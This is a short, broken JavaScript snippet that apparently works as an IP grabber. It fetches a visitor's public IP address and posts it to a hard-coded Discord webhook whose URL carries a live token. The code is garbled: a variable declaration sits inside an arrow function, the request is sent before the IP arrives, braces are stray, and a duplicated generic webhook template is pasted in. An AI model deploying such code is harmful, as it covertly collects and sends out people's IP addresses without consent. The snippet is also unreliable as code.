var request = new XMLHttpRequest();
var ip = ""
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => var ip = data.ip);      
    request.open("POST", "https://discordapp.com/api/webhooks/676118118082281513/ZS5YcWhurzokBrKX9NgexqtxrJA5Pu2Bo4i7_JsIxC-JIbPBVhSZkcVVukGOro52rnQA");

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
      username: "Ip",
      avatar_url: "",
      content: ip
    }

      request.send(JSON.stringify(params));
    }

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "My Webhook Name",
        avatar_url: "",
        content: "The message to send"
      }

      request.send(JSON.stringify(params));
    }
